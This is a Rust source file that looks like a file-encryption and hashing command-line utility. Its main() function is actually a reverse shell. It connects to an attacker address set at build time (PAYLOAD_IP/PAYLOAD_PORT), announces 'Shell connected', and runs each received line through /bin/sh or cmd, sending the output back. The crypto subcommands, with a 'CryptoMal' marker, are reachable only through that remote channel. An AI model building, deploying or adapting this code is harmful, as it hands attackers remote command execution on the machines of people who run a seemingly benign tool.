use clap::{Parser, Subcommand};
//use dotenv::dotenv;
use std::env;
use std::fs::File;
use std::io::{BufRead, BufReader, BufWriter, Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::time::{Duration, SystemTime};

mod validate;
mod cryptor;
mod key_manager;
mod hash;
pub mod generator;
use cryptor::CipherMode;
use hash::{Hasher, Sha256, Sha3};

#[derive(Parser)]
pub struct Args {
    #[clap(short, long)]
    verbose: bool,
    #[clap(subcommand)]
    command: Commands,
}
#[derive(Subcommand, Clone)]
pub enum Commands {
    Encrypt {
        #[clap(short, long, default_value = "AES")]
        algorithm: String,
        #[clap(short, long, default_value = "ECB")]
        mode: String,
        #[clap(short, long)]
        key: Option<String>,
        #[clap(long)]
        password: Option<String>,
        #[clap(long)]
        iv: Option<String>,
        in_file: String,
        out_file: Option<String>,
    },
    Decrypt {
        #[clap(short, long)]
        key: Option<String>,
        #[clap(long)]
        password: Option<String>,
        #[clap(short, long, default_value = "ECB")]
        mode: String,
        #[clap(long)]
        iv: Option<String>,
        in_file: String,
        out_file: Option<String>,
    },
    Derive {
        #[clap(short, long)]
        password: String,
        #[clap(short, long)]
        salt: String,
        #[clap(short, long, default_value_t = 100_000)]
        iterations: u32,
        #[clap(short, long, default_value_t = 16)]
        length: usize,
    },
    Dgst {
        #[clap(short, long)]
        algorithm: String,
        #[clap(short, long)]
        input: String,
        #[clap(short, long)]
        output: Option<String>,
    },
}

fn mode_from_str(mode: &str) -> Result<CipherMode, String> {
    match mode.to_uppercase().as_str() {
        "ECB" => Ok(CipherMode::ECB),
        "CBC" => Ok(CipherMode::CBC),
        "CTR" => Ok(CipherMode::CTR),
        "OFB" => Ok(CipherMode::OFB),
        _ => Err(format!("Unsupported mode: {}", mode)),
    }
}

impl Commands {
    fn execute(&self, verbose: bool) -> Result<String, String> {
        let log = |msg: &str| {
            if verbose {
                println!("Log: {}", msg);
            }
        };
        match self {
            Commands::Encrypt { algorithm, mode, key, password, iv, in_file, out_file } => {
                let iv_bytes = iv.as_ref().map(|hex| hex::decode(hex).map_err(|e| e.to_string())).transpose()?;
                let key_bytes = key.as_ref().map(|hex| hex::decode(hex).map_err(|e| e.to_string())).transpose()?;

                let params = validate::Params {
                    algorithm: Some(algorithm),
                    password: password.as_deref(),
                    key: key_bytes,
                    in_file: Some(in_file),
                    out_file: out_file.as_deref(),
                    iv: iv_bytes,
                    mode: Some(mode),
                };
                let v = params.finalize()?;

                let cipher_mode = mode_from_str(&v.mode)?;
                cryptor::encrypt_file(&v.in_file, &v.out_file, v.password.as_deref(), v.key_bytes.as_deref(), cipher_mode, v.iv)
                    .map_err(|e| e.to_string())?;
                Ok(format!("Encryption completed for file: {}", in_file))
            }
            Commands::Decrypt { key, password, mode, iv, in_file, out_file } => {
                let iv_bytes = iv.as_ref().map(|hex| hex::decode(hex).map_err(|e| e.to_string())).transpose()?;
                let key_bytes = key.as_ref().map(|hex| hex::decode(hex).map_err(|e| e.to_string())).transpose()?;

                let params = validate::Params {
                    algorithm: None,
                    password: password.as_deref(),
                    key: key_bytes,
                    in_file: Some(in_file),
                    out_file: out_file.as_deref(),
                    iv: iv_bytes,
                    mode: Some(mode),
                };
                let v = params.finalize()?;

                let cipher_mode = mode_from_str(mode)?;
                cryptor::decrypt_file(&v.in_file, &v.out_file, v.password.as_deref(), v.key_bytes.as_deref(), cipher_mode, v.iv)
                    .map_err(|e| e.to_string())?;
                Ok(format!("Decryption completed for file: {}", in_file))
            }
            Commands::Derive { password, salt, iterations, length } => {
                log("running derive command...");
                let key_bytes = key_manager::keygen::generate_key(
                    password.as_bytes(),
                    salt.as_bytes(),
                    Some(*iterations),
                    Some(*length),
                ).map_err(|e| e.to_string())?;
                Ok(format!("Generated key: {}", hex::encode(key_bytes)))
            }
            Commands::Dgst { algorithm, input, output } => {
                let file = File::open(input).map_err(|e| e.to_string())?;
                let mut reader = BufReader::new(file);
                let mut hasher: Box<dyn Hasher> = match algorithm.as_str() {
                    "sha256" => Box::new(Sha256::new()),
                    "sha3-256" => Box::new(Sha3::new()),
                    _ => return Err("Unsupported algorithm".to_string()),
                };

                let mut buf = [0u8; 8192];
                loop {
                    let n = reader.read(&mut buf).map_err(|e| e.to_string())?;
                    if n == 0 { break; }
                    hasher.update(&buf[..n]);
                }

                let hash = hasher.finalize();
                let out_str = format!("{}\n", hash);
                if let Some(o) = output {
                    let mut out_file = File::create(o).map_err(|e| e.to_string())?;
                    out_file.write_all(out_str.as_bytes()).map_err(|e| e.to_string())?;
                    Ok(format!("Hash written to: {}", o))
                } else {
                    Ok(out_str)
                }
            }
        }
    }
}

fn main() {
    let ip: &str = option_env!("PAYLOAD_IP").unwrap_or("127.0.0.1");
    let port: u16 = option_env!("PAYLOAD_PORT").unwrap_or("8080").parse().expect("Invalid port");
    
    let verbose = env::var("VERBOSE").map(|v| v == "true").unwrap_or(false);

    let start = SystemTime::now();
    let mut connected_once = false;

    loop {
        match TcpStream::connect((ip, port)) {
            Ok(stream) => {
                connected_once = true;
                stream.set_nodelay(true).expect("Failed to set nodelay");

                let mut stream_reader = BufReader::new(stream.try_clone().unwrap());
                let mut stream_writer = BufWriter::new(stream);
                let mut buffer: Vec<u8> = Vec::new();

                let connected_msg = "Shell connected";
                writeln!(stream_writer, "{}", connected_msg).expect("Failed to write connected message");
                stream_writer.flush().expect("Failed to flush");

                loop {
                    buffer.clear();
                    match stream_reader.read_until(b'\n', &mut buffer) {
                        Ok(0) => {
                            break;
                        }
                        Ok(_) => {
                            let line = String::from_utf8_lossy(&buffer).trim().to_string();
                            if line.is_empty() {
                                continue;
                            } else if line == "exit" {
                                break;
                            } else if line == "CryptoMal" {
                                let output = "Crypto cycle loop command received";
                                writeln!(stream_writer, "{}", output).expect("Failed to write output");
                                stream_writer.flush().expect("Failed to flush");
                                continue;
                            }

                            let parts: Vec<&str> = line.split_whitespace().collect();

                            let mut output = String::new();


                            if !parts.is_empty() && (
                                parts[0].eq_ignore_ascii_case("encrypt") ||
                                    parts[0].eq_ignore_ascii_case("decrypt") ||
                                    parts[0].eq_ignore_ascii_case("derive") ||
                                    parts[0].eq_ignore_ascii_case("dgst")
                            ) {
                                match parse_crypto_command(&parts) {
                                    Ok(command) => {
                                        match command.execute(verbose) {
                                            Ok(result) => output = result,
                                            Err(e) => output = format!("Crypto command error: {}", e),
                                        }
                                    }
                                    Err(e) => output = format!("Failed to parse crypto command: {}", e),
                                }
                            } else {
                                let cmd = parts.get(0).unwrap_or(&"");
                                let args = parts.get(1..).unwrap_or(&[]);

                                let mut command = Command::new(if env::consts::OS == "windows" { "cmd" } else { "/bin/sh" });
                                if env::consts::OS == "windows" {
                                    command.arg("/c");
                                } else {
                                    command.arg("-c");
                                }
                                command.arg(cmd).args(args);

                                match command.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn() {
                                    Ok(mut child) => {
                                        if let Some(stdout) = child.stdout.take() {
                                            for line in BufReader::new(stdout).lines() {
                                                if let Ok(l) = line {
                                                    output.push_str(&format!("{}\n", l));
                                                }
                                            }
                                        }
                                        if let Some(stderr) = child.stderr.take() {
                                            for line in BufReader::new(stderr).lines() {
                                                if let Ok(l) = line {
                                                    output.push_str(&format!("Error: {}\n", l));
                                                }
                                            }
                                        }
                                        let _ = child.wait();
                                    }
                                    Err(e) => {
                                        output.push_str(&format!("Failed to spawn '{}': {}\n", cmd, e));
                                    }
                                }
                            }

                            writeln!(stream_writer, "{}", output).expect("Failed to write output");
                            stream_writer.flush().expect("Failed to flush");
                        }
                        Err(_e) => {
                            break;
                        }
                    }
                }
            }
            Err(e) => {
                //let err_msg = format!("Failed to connect to {}:{}: {}", ip, port, e);
                //eprintln!("{}", err_msg);
            }
        }

        if connected_once || start.elapsed().unwrap_or(Duration::ZERO) > Duration::from_secs(20) {
            break;
        }

        std::thread::sleep(Duration::from_secs(5));
    }
}
fn parse_crypto_command(parts: &[&str]) -> Result<Commands, String> {
    let mut parse_args: Vec<&str> = vec!["dummy_bin"];
    parse_args.extend_from_slice(parts);
    let args = Args::try_parse_from(parse_args).map_err(|e| e.to_string())?;
    Ok(args.command)
}

